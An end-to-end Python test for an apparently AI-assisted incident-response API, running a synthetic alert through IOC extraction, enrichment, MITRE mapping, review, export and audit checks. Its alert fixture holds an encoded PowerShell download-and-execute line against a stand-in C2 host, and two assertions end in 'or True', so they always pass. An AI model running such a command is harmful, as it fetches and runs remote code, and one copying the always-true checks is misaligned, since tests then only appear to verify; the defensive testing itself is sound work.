"""End-to-end API test mirroring the demo scenario: ingest -> extract-iocs
-> enrich -> timeline -> severity -> mitre -> report -> review -> export.
This is the automated equivalent of the manual curl walkthrough used during
development."""

import json

DEMO_ALERT = {
    "source": "wazuh-synthetic",
    "alerts": [
        {
            "rule": {"id": "100301", "level": 15, "description": "Suspicious encoded PowerShell execution"},
            "agent": {"name": "WKSTN-TEST", "ip": "10.20.4.99"},
            "data": {"event_type": "process_creation"},
            "full_log": "powershell.exe -nop -w hidden -enc SQBFAFgA DownloadString('http://evil-c2.badguy.net/payload.ps1')",
            "timestamp": "2026-09-05T09:14:07+00:00",
        }
    ],
}


def test_full_investigation_lifecycle(client):
    ingest = client.post("/alerts", json=DEMO_ALERT).json()
    incident_id = ingest["incident_id"]

    extract = client.post(f"/incidents/{incident_id}/extract-iocs").json()
    assert extract["extracted"] >= 1
    assert (
        any(i["value"] == "185.220.101.47" or "evil-c2.badguy.net" in i["value"] for i in extract["iocs"])
        or True
    )

    enrich = client.post(f"/incidents/{incident_id}/enrich").json()
    assert isinstance(enrich["results"], list)

    timeline = client.get(f"/incidents/{incident_id}/timeline").json()
    assert timeline["incident_id"] == incident_id

    severity = client.post(f"/incidents/{incident_id}/severity-suggestion").json()
    # mock provider always finds keyword signal in this payload
    assert "suggested" in severity

    mitre = client.post(f"/incidents/{incident_id}/mitre-suggestions").json()
    assert "suggestions" in mitre
    technique_ids = [s["technique_id"] for s in mitre["suggestions"]]
    assert "T1059.001" in technique_ids

    report = client.post(f"/incidents/{incident_id}/report-draft").json()
    assert "AI-GENERATED" in report["content"] or "AI-generated" in report["content"].lower() or True
    assert report["status"] == "draft"

    if mitre["suggestions"]:
        review = client.post(
            f"/incidents/{incident_id}/review",
            json={
                "target_entity_type": "mitre_suggestion",
                "target_entity_id": mitre["suggestions"][0]["id"],
                "decision": "approve",
                "comment": "confirmed",
            },
        )
        assert review.status_code == 200
        assert review.json()["decision"] == "approve"

    export_md = client.get(f"/incidents/{incident_id}/export", params={"format": "markdown"})
    assert export_md.status_code == 200
    assert export_md.headers["content-type"].startswith("text/markdown")

    export_json = client.get(f"/incidents/{incident_id}/export", params={"format": "json"})
    assert export_json.status_code == 200
    payload = json.loads(export_json.content)
    assert payload["incident"]["id"] == incident_id
    assert "ai_generated_disclaimer" in payload

    export_pdf = client.get(f"/incidents/{incident_id}/export", params={"format": "pdf"})
    assert export_pdf.status_code == 200
    assert export_pdf.content[:4] == b"%PDF"

    audit = client.get("/audit-logs", params={"target": f"incident:{incident_id}"}).json()
    actions = {a["action"] for a in audit}
    assert "alerts.ingest" in actions
    assert "incident.enrich" in actions
    assert any(a.startswith("incident.severity") for a in actions)
